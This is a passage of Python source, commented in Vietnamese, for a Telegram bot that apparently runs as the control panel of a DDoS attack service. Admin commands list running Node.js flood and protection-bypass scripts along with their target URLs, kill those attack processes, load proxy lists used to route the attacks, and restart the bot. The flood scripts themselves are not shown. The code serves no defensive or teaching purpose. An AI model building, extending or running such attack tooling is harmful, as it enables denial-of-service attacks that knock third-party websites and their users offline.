                    send_monitoring_info,
                    interval=15, #15 gi√¢y g·ª≠i c√°i
                    first=1,
                    name='system_monitoring'
                )
                await update.message.reply_text("ƒê√£ b·∫≠t monitoring!")
                return
            elif context.args[0].lower() == "off":
                if monitoring_task and not monitoring_task.removed:
                    monitoring_task.schedule_removal()
                    monitoring_task = None
                    await update.message.reply_text("ƒê√£ t·∫Øt monitoring!")
                    return
                await update.message.reply_text("Monitoring ch∆∞a ƒë∆∞·ª£c b·∫≠t!")
                return

        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        # Process count
        process_count = len(psutil.pids())

        # Network info
        net_io = psutil.net_io_counters()
        bytes_sent = round(net_io.bytes_sent/1024/1024, 2)
        bytes_recv = round(net_io.bytes_recv/1024/1024, 2)

        # Disk info
        total_disk_space = 0
        used_disk_space = 0
        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    total_disk_space += partition_usage.total
                    used_disk_space += partition_usage.used
                except Exception:
                    continue
            
            total_disk_space_gb = round(total_disk_space/1024/1024/1024, 2)
            used_disk_space_gb = round(used_disk_space/1024/1024/1024, 2)
            disk_percent = round((used_disk_space / total_disk_space) * 100, 2)
        except Exception as e:
            logger.error(f"Error getting disk info: {e}")
            total_disk_space_gb = used_disk_space_gb = disk_percent = 0

        # Uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{days} ng√†y, {hours} gi·ªù, {minutes} ph√∫t"

        system_info = f"""
‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ„Äå Th√¥ng Tin H·ªá Th·ªëng „Äç‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚î£‚îÅ‚ä≥ üî≤ CPU: {cpu_percent}%
‚î£‚îÅ‚ä≥ üíæ RAM: {memory_percent}%
‚î£‚îÅ‚ä≥ üìä RAM ƒë√£ d√πng: {memory_used}/{memory_total}GB
‚î£‚îÅ‚ä≥ üíø T·ªïng b·ªô nh·ªõ: {total_disk_space_gb}GB
‚î£‚îÅ‚ä≥ üìÄ ƒê√£ s·ª≠ d·ª•ng: {used_disk_space_gb}GB ({disk_percent}%)
‚î£‚îÅ‚ä≥ üåê Network:
‚î£‚îÅ‚ä≥ ‚¨ÜÔ∏è ƒê√£ g·ª≠i: {bytes_sent}MB
‚î£‚îÅ‚ä≥ ‚¨áÔ∏è ƒê√£ nh·∫≠n: {bytes_recv}MB
‚î£‚îÅ‚ä≥ ‚è∞ Uptime: {uptime_str}
‚îó‚îÅ‚ä≥ üì± S·ªë ti·∫øn tr√¨nh: {process_count}
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"""

        # Th√™m th√¥ng tin v·ªÅ tr·∫°ng th√°i monitoring
        if monitoring_task and not monitoring_task.removed:
            system_info += "\nüìä Monitoring: ƒêang ch·∫°y"
        else:
            system_info += "\nüìä Monitoring: ƒê√£ t·∫Øt"

        await update.message.reply_text(system_info)

    except Exception as e:
        logger.error(f"Error in task command: {e}")
        await update.message.reply_text(f"‚ùå L·ªói khi l·∫•y th√¥ng tin h·ªá th·ªëng: {str(e)}")

@restrict_room
async def list_processes(update: Update, context: CallbackContext):
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # T√¨m t·∫•t c·∫£ c√°c ti·∫øn tr√¨nh node.js ƒëang ch·∫°y
        node_processes = []
        # Th√™m c√°c file m·ªõi v√†o danh s√°ch target
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time', 'memory_info']):
            try:
                # Ki·ªÉm tra n·∫øu process info l√† None
                if not proc.info:
                    continue
                    
                # Ki·ªÉm tra t√™n process
                if proc.info.get('name') != 'node':
                    continue
                    
                # L·∫•y v√† ki·ªÉm tra cmdline
                cmdline = proc.info.get('cmdline')
                if not cmdline:  # Skip if cmdline is None or empty
                    continue
                    
                # Ki·ªÉm tra xem c√≥ ph·∫£i process target kh√¥ng
                is_target_process = any(file in ' '.join(cmdline) for file in target_files)
                
                if is_target_process:
                    process = psutil.Process(proc.info['pid'])
                    create_time = datetime.fromtimestamp(process.create_time())
                    running_time = datetime.now() - create_time
                    memory_info = process.memory_info()
                    memory_mb = round(memory_info.rss / 1024 / 1024, 2) if memory_info else 0
                    
                    target_url = "N/A"
                    process_type = "N/A"
                    
                    # T√¨m URL v√† lo·∫°i process
                    for i, cmd in enumerate(cmdline):
                        if any(file in cmd for file in target_files):
                            # X√°c ƒë·ªãnh lo·∫°i process d·ª±a tr√™n t√™n file
                            if "two-methods.js" in cmd:
                                process_type = "FLOOD/BYPASS"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "non-protection.js" in cmd:
                                process_type = "FLOOD2"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "try-protection.js" in cmd:
                                process_type = "BYPASS2"
                                # V·ªõi try-protection.js, URL n·∫±m ·ªü v·ªã tr√≠ cu·ªëi c√πng
                                target_url = cmdline[-1]
                            break
                    
                    node_processes.append({
                        'pid': proc.info['pid'],
                        'target': target_url,
                        'type': process_type,
                        'memory': memory_mb,
                        'running_time': running_time
                    })
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
                logger.error(f"Error processing process: {e}")
                continue

        if not node_processes:
            await update.message.reply_text('''<blockquote expandable>
Kh√¥ng c√≥ ti·∫øn tr√¨nh n√†o ƒëang ch·∫°y</blockquote>''', parse_mode='HTML')
            return

        # Chia danh s√°ch ti·∫øn tr√¨nh th√†nh c√°c ph·∫ßn nh·ªè h∆°n
        MAX_PROCESSES_PER_MESSAGE = 5
        chunks = [node_processes[i:i + MAX_PROCESSES_PER_MESSAGE] 
                 for i in range(0, len(node_processes), MAX_PROCESSES_PER_MESSAGE)]
        
        # G·ª≠i t·ª´ng ph·∫ßn nh∆∞ m·ªôt tin nh·∫Øn ri√™ng bi·ªát
        for index, chunk in enumerate(chunks):
            process_list = []
            for i, proc in enumerate(chunk, 1 + index * MAX_PROCESSES_PER_MESSAGE):
                hours, remainder = divmod(proc['running_time'].seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                runtime = f"{hours}h {minutes}m {seconds}s"
                
                process_list.append(f'''<blockquote expandable>
‚ïë üìå Ti·∫øn tr√¨nh {i}:
‚ïë ‚Ä¢ PID: <code>{proc['pid']}</code>
‚ïë ‚Ä¢ Target: <code>{proc['target']}</code>
‚ïë ‚Ä¢ Type: {proc['type']}
‚ïë ‚Ä¢ RAM: {proc['memory']} MB
‚ïë ‚Ä¢ Th·ªùi gian ch·∫°y: {runtime}</blockquote>''')

            # T·∫°o tin nh·∫Øn cho ph·∫ßn hi·ªán t·∫°i
            message = f'''<blockquote expandable>
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìä DANH S√ÅCH TI·∫æN TR√åNH ({index + 1}/{len(chunks)})
‚ïë ‚Ä¢ T·ªïng s·ªë: {len(node_processes)}{''.join(process_list)}
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</blockquote>'''

            await update.message.reply_text(message, parse_mode='HTML')
            # ƒê·ª£i m·ªôt ch√∫t gi·ªØa c√°c tin nh·∫Øn ƒë·ªÉ tr√°nh spam
            if index < len(chunks) - 1:
                await asyncio.sleep(0.5)

    except Exception as e:
        logger.error(f"Error in list_processes command: {e}")
        await update.message.reply_text(f'''<blockquote expandable>
‚ùå L·ªói khi l·∫•y danh s√°ch ti·∫øn tr√¨nh
‚Ä¢ {str(e)}</blockquote>''')

@restrict_room
async def kill_ddos(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        args = context.args
        specific_pid = None if not args else int(args[0])
        killed_processes = []
        
        # Danh s√°ch c√°c file c·∫ßn ki·ªÉm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        if specific_pid:
            # Kill specific process
            try:
                process = psutil.Process(specific_pid)
                cmdline = ' '.join(process.cmdline())
                if process.name() == 'node' and any(file in cmdline for file in target_files):
                    process.kill()
                    killed_processes.append(specific_pid)
                else:
                    await update.message.reply_text(f'''
‚ùå PID {specific_pid} KH√îNG H·ª¢P L·ªÜ
‚Ä¢ PID kh√¥ng ph·∫£i l√† ti·∫øn tr√¨nh DDoS
‚Ä¢ S·ª≠ d·ª•ng /ls ƒë·ªÉ xem danh s√°ch PID
''')
                    return
            except psutil.NoSuchProcess:
                await update.message.reply_text(f'''
‚ùå KH√îNG T√åM TH·∫§Y PID {specific_pid}
‚Ä¢ PID kh√¥ng t·ªìn t·∫°i
‚Ä¢ S·ª≠ d·ª•ng /lsd ƒë·ªÉ xem danh s√°ch PID
''')
                return
            except Exception as e:
                logger.error(f"Error killing specific process: {e}")
                await update.message.reply_text(f"‚ùå L·ªói khi kill PID {specific_pid}: {str(e)}")
                return
        else:
            # Kill all processes
            bot_active = False
            
            # Kill through psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'] == 'node':
                        cmdline = proc.info.get('cmdline', [])
                        if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                            process = psutil.Process(proc.info['pid'])
                            process.kill()
                            killed_processes.append(proc.info['pid'])
                except Exception as e:
                    logger.error(f"Error killing process: {e}")
                    continue
            
            # Additional shell kill command for cleanup
            try:
                if os.name == 'nt':  # Windows
                    os.system('taskkill /F /IM node.exe')
                else:  # Linux/Unix
                    kill_commands = [
                        "pkill -9 -f 'node.*two-methods.js'",
                        "pkill -9 -f 'node.*non-protection.js'",
                        "pkill -9 -f 'node.*try-protection.js'"
                    ]
                    for cmd in kill_commands:
                        os.system(cmd)
            except Exception as e:
                logger.error(f"Error killing via shell: {e}")

        # Prepare response message
        if killed_processes:
            if specific_pid:
                message = f'''
‚úÖ KILL PID {specific_pid} TH√ÄNH C√îNG
‚Ä¢ Ti·∫øn tr√¨nh ƒë√£ d·ª´ng
‚Ä¢ S·ª≠ d·ª•ng /lsd ƒë·ªÉ xem danh s√°ch c√≤n l·∫°i'''
            else:
                message = f'''
‚úÖ KILL ALL SUCCESS
‚Ä¢ ƒê√£ d·ª´ng {len(killed_processes)} ti·∫øn tr√¨nh
‚Ä¢ PIDs: {', '.join(map(str, killed_processes))}
‚Ä¢ Bot ƒë√£ t·∫Øt
‚Ä¢ S·ª≠ d·ª•ng /ond ƒë·ªÉ b·∫≠t l·∫°i'''
        else:
            message = '''
‚ùå KH√îNG C√ì TI·∫æN TR√åNH ƒêANG CH·∫†Y
‚Ä¢ Bot ƒë√£ t·∫Øt
‚Ä¢ S·ª≠ d·ª•ng /ond ƒë·ªÉ b·∫≠t l·∫°i'''

        await update.message.reply_text(message)
            
    except ValueError:
        await update.message.reply_text('''
‚ùå PID KH√îNG H·ª¢P L·ªÜ
‚ñ∂ Usage:
‚Ä¢ /kill : D·ª´ng t·∫•t c·∫£ ti·∫øn tr√¨nh
‚Ä¢ /kill <pid> : D·ª´ng ti·∫øn tr√¨nh c·ª• th·ªÉ
‚Ä¢ S·ª≠ d·ª•ng /lsd ƒë·ªÉ xem danh s√°ch PID''')
    except Exception as e:
        logger.error(f"Error in kill_ddos: {e}")

def kill_all_processes():
    """Kill all running Node.js processes on startup"""
    try:
        logger.info("Killing all existing Node.js processes...")
        killed_count = 0
        
        # Danh s√°ch c√°c file c·∫ßn ki·ªÉm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        # Kill qua psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] == 'node':
                    cmdline = proc.info.get('cmdline', [])
                    # Ki·ªÉm tra n·∫øu cmdline ch·ª©a b·∫•t k·ª≥ file n√†o trong target_files
                    if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                        process = psutil.Process(proc.info['pid'])
                        
                        # Kill c√°c ti·∫øn tr√¨nh con tr∆∞·ªõc
                        children = process.children(recursive=True)
                        for child in children:
                            child.kill()
                        psutil.wait_procs(children, timeout=3)
                        
                        # Kill ti·∫øn tr√¨nh cha
                        process.kill()
                        killed_count += 1
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                logger.error(f"Error killing process via psutil: {e}")
                continue
                
        # Kill qua shell command ƒë·ªÉ ƒë·∫£m b·∫£o
        try:
            if os.name == 'nt':  # Windows
                os.system('taskkill /F /IM node.exe')
            else:  # Linux/Unix
                # Kill c·∫£ hai lo·∫°i process
                kill_commands = [
                    "pkill -9 -f 'node.*two-methods.js'",
                    "pkill -9 -f 'node.*non-protection.js'",
                    "pkill -9 -f 'node.*try-protection.js'"
                ]
                for cmd in kill_commands:
                    os.system(cmd)
        except Exception as e:
            logger.error(f"Error killing processes via shell: {e}")
            
        # Clear attack processes dictionary
        attack_processes.clear()
        
        logger.info(f"Successfully killed {killed_count} Node.js processes")
        
    except Exception as e:
        logger.error(f"Error in kill_all_processes: {e}")


async def add_proxy(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # L·∫•y n·ªôi dung tin nh·∫Øn
        message_text = update.message.text
        
        # T√°ch l·ªánh v√† danh s√°ch proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå KH√îNG C√ì PROXY
‚ïë ‚Ä¢ Vui l√≤ng nh·∫≠p proxy theo ƒë·ªãnh d·∫°ng
‚ïë ‚Ä¢ /addpx
‚ïë ‚Ä¢ ip:port
‚ïë ‚Ä¢ ip:port
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
            
        # L·ªçc b·ªè d√≤ng l·ªánh v√† l·∫•y danh s√°ch proxy
        proxies = lines[1:]
        
        # Ki·ªÉm tra ƒë·ªãnh d·∫°ng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # B·ªè qua d√≤ng tr·ªëng
                continue
                
            # Ki·ªÉm tra ƒë·ªãnh d·∫°ng ip:port
            try:
                ip, port = proxy.split(':')
                # Ki·ªÉm tra IP h·ª£p l·ªá
                ipaddress.ip_address(ip)
                # Ki·ªÉm tra port h·ª£p lÔøΩÔøΩÔøΩ
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå KH√îNG C√ì PROXY H·ª¢P L·ªÜ
‚ïë ‚Ä¢ T·∫•t c·∫£ proxy kh√¥ng ƒë√∫ng ƒë·ªãnh d·∫°ng
‚ïë ‚Ä¢ Vui l√≤ng ki·ªÉm tra l·∫°i
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
            
        # L∆∞u proxy v√†o file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        # Ghi proxy m·ªõi v√†o file, ghi ƒë√® proxy c≈©
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_proxies))
            
        # G·ª≠i th√¥ng b√°o k·∫øt qu·∫£
        message = f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚úÖ C·∫¨P NH·∫¨T PROXY TH√ÄNH C√îNG
‚ïë ‚Ä¢ T·ªïng s·ªë proxy: {len(valid_proxies)}
‚ïë ‚Ä¢ Proxy h·ª£p l·ªá: {len(valid_proxies)}'''
        
        if invalid_proxies:
            message += f'''
‚ïë ‚Ä¢ Proxy kh√¥ng h·ª£p l·ªá: {len(invalid_proxies)}
‚ïë ‚Ä¢ Danh s√°ch proxy l·ªói:
‚ïë {chr(10).join(f"‚Ä¢ {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
‚ïë ‚Ä¢ V√† {len(invalid_proxies) - 5} proxy kh√°c...'''
            
        message += '''
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in add_proxy: {e}")
        await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå L·ªñI C·∫¨P NH·∫¨T PROXY
‚ïë ‚Ä¢ {str(e)}
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
        
async def update_proxy_new(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # L·∫•y n·ªôi dung tin nh·∫Øn
        message_text = update.message.text
        
        # T√°ch l·ªánh v√† danh s√°ch proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå KH√îNG C√ì PROXY
‚ïë ‚Ä¢ Vui l√≤ng nh·∫≠p proxy theo ƒë·ªãnh d·∫°ng
‚ïë ‚Ä¢ /uppx
‚ïë ‚Ä¢ ip:port
‚ïë ‚Ä¢ ip:port
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
            
        # L·ªçc b·ªè d√≤ng l·ªánh v√† l·∫•y danh s√°ch proxy
        proxies = lines[1:]
        
        # Ki·ªÉm tra ƒë·ªãnh d·∫°ng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # B·ªè qua d√≤ng tr·ªëng
                continue
                
            # Ki·ªÉm tra ƒë·ªãnh d·∫°ng ip:port
            try:
                ip, port = proxy.split(':')
                # Ki·ªÉm tra IP h·ª£p l·ªá
                ipaddress.ip_address(ip)
                # Ki·ªÉm tra port h·ª£p l·ªá
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå KH√îNG C√ì PROXY H·ª¢P L·ªÜ
‚ïë ‚Ä¢ T·∫•t c·∫£ proxy kh√¥ng ƒë√∫ng ƒë·ªãnh d·∫°ng
‚ïë ‚Ä¢ Vui l√≤ng ki·ªÉm tra l·∫°i
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
            
        # ƒê·ªçc proxy c≈© t·ª´ file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        existing_proxies = []
        if os.path.exists(proxy_path):
            with open(proxy_path, 'r', encoding='utf-8') as f:
                existing_proxies = [line.strip() for line in f if line.strip()]
        
        # Lo·∫°i b·ªè proxy tr√πng l·∫∑p t·ª´ danh s√°ch m·ªõi
        new_valid_proxies = [p for p in valid_proxies if p not in existing_proxies]
        
        # K·∫øt h·ª£p proxy m·ªõi v√† c≈©
        all_proxies = new_valid_proxies + existing_proxies
        
        # L∆∞u t·∫•t c·∫£ proxy v√†o file
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_proxies))
            
        # G·ª≠i th√¥ng b√°o k·∫øt qu·∫£
        message = f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚úÖ C·∫¨P NH·∫¨T PROXY TH√ÄNH C√îNG
‚ïë ‚Ä¢ Proxy c≈©: {len(existing_proxies)}
‚ïë ‚Ä¢ Proxy m·ªõi th√™m: {len(new_valid_proxies)}
‚ïë ‚Ä¢ T·ªïng s·ªë proxy: {len(all_proxies)}'''
        
        if invalid_proxies:
            message += f'''
‚ïë ‚Ä¢ Proxy kh√¥ng h·ª£p l·ªá: {len(invalid_proxies)}
‚ïë ‚Ä¢ Danh s√°ch proxy l·ªói:
‚ïë {chr(10).join(f"‚Ä¢ {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
‚ïë ‚Ä¢ V√† {len(invalid_proxies) - 5} proxy kh√°c...'''
            
        message += '''
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå L·ªñI C·∫¨P NH·∫¨T PROXY
‚ïë ‚Ä¢ {str(e)}
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')


@restrict_room
async def restart_bot(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        # G·ª≠i th√¥ng b√°o ƒëang kh·ªüi ƒë·ªông l·∫°i v√† l∆∞u message
        status_message = await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üîÑ ƒêANG KH·ªûI ƒê·ªòNG L·∫†I
‚ïë ‚Ä¢ Vui l√≤ng ƒë·ª£i...
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
        
        # L∆∞u th√¥ng tin kh·ªüi ƒë·ªông l·∫°i
        restart_info = {
            "chat_id": update.effective_chat.id,
            "message_id": status_message.message_id,
            "restart_time": time.time(),
            "action": "restart"
        }
        
        # ƒê·∫£m b·∫£o th∆∞ m·ª•c t·ªìn t·∫°i
        os.makedirs('data', exist_ok=True)
        
        # L∆∞u th√¥ng tin v√†o file trong th∆∞ m·ª•c data
        with open("data/restart_info.json", "w") as f:
            json.dump(restart_info, f)
            
        logger.info(f"Saved restart info: {restart_info}")
        
        # ƒê·ª£i 1 gi√¢y ƒë·ªÉ ƒë·∫£m b·∫£o file ƒë∆∞·ª£c l∆∞u
        await asyncio.sleep(1)
        
        # D·ª´ng t·∫•t c·∫£ c√°c ti·∫øn tr√¨nh ddos ƒëang ch·∫°y
        await cleanup_attacks()
        
        logger.info("Bot is restarting...")
        
        # Kh·ªüi ƒë·ªông l·∫°i script
        os.execl(sys.executable, sys.executable, *sys.argv)
        
    except Exception as e:
        logger.error(f"Error in restart command: {e}")
        await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå L·ªñI KH·ªûI ƒê·ªòNG L·∫†I
‚ïë ‚Ä¢ {str(e)}
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')

async def send_restart_notification(application: Application) -> None:
    """Send notification after bot restart"""
    try:
        # Thay ƒë·ªïi ƒë∆∞·ªùng d·∫´n file
        if os.path.exists("data/restart_info.json"):
            with open("data/restart_info.json", "r") as f:
                restart_info = json.load(f)
            
            restart_duration = round(time.time() - restart_info["restart_time"], 2)
            chat_id = restart_info["chat_id"]
            message_id = restart_info["message_id"]
            action = restart_info.get("action", "restart")

            message = f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚úÖ KH·ªûI ƒê·ªòNG L·∫†I TH√ÄNH C√îNG
‚ïë ‚ö°Ô∏è T·ªïng th·ªùi gian: {restart_duration}s
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê'''

            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    await application.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=message
                    )
                    logger.info("Successfully sent restart notification")
                    break
                except (TimedOut, RetryAfter) as e:
                    retry_count += 1
                    if retry_count < max_retries:
                        await asyncio.sleep(2)
                    else:
                        logger.error(f"Failed to send restart notification after {max_retries} retries")
                except Exception as e:
                    logger.error(f"Error sending restart notification: {e}")
                    break
            
            try:
                os.remove("data/restart_info.json")
                logger.info("Removed restart info file")
            except Exception as e:
                logger.error(f"Error removing restart info file: {e}")
            
            # ƒê·∫£m b·∫£o bot ƒë∆∞·ª£c b·∫≠t
            global bot_active
            bot_active = True
            
    except Exception as e:
        logger.error(f"Error in send_restart_notification: {e}")

@restrict_room
async def start(update: Update, context: CallbackContext):
